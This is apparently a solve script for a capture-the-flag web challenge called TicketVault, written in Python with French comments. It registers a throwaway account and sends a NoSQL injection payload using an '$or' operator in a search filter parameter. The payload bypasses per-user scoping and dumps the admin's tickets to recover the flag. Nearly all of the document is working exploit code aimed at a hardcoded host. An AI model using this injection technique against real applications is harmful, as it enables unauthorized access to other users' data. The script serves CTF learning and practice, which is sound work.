#!/usr/bin/env python3
"""
TicketVault (battleCTF, web, 30 pts) - solve script.

NoSQL injection via le champ "Advanced filter (JSON)" de /tickets/search.
buildScopedFilter ne force owner=session que si la cle "owner" est au top-level,
et retourne tel quel tout filtre contenant $or. On lit donc les tickets de l'admin.

Aucune dependance externe (stdlib urllib).
Usage: python3 solve.py [host:port]   (defaut: 144.217.91.111:3001)
"""
import sys
import re
import json
import random
import urllib.parse
import urllib.request
import http.cookiejar

HOST = sys.argv[1] if len(sys.argv) > 1 else "144.217.91.111:3001"
BASE = f"http://{HOST}"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post(path, fields):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(BASE + path, data=data, method="POST")
    return opener.open(req, timeout=15).read().decode(errors="replace")


def get(path):
    return opener.open(BASE + path, timeout=15).read().decode(errors="replace")


def main():
    # 1) compte jetable (login est sanitise, mais register ne l'est pas; peu importe
    #    ici on a juste besoin d'une session authentifiee valide)
    user = f"solver_{random.randint(1000, 999999)}"
    post("/register", {"username": user, "password": "pass123"})
    print(f"[+] registered as {user}")

    # 2) injection: $or contourne entierement le scope owner
    payload = json.dumps({"$or": [{"owner": "admin"}]})
    qs = urllib.parse.urlencode({"filter": payload})
    html = get(f"/tickets/search?{qs}")

    # 3) extraire le flag
    m = re.search(r"[A-Za-z0-9_]+\{[^}]+\}", html)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
    else:
        print("[-] flag non trouve, dump des tickets admin:")
        for blk in re.findall(r'<div class="ticket">(.*?)</div>\s*</div>', html, re.S):
            print("   ", re.sub(r"<[^>]*>", " ", blk).strip())


if __name__ == "__main__":
    main()
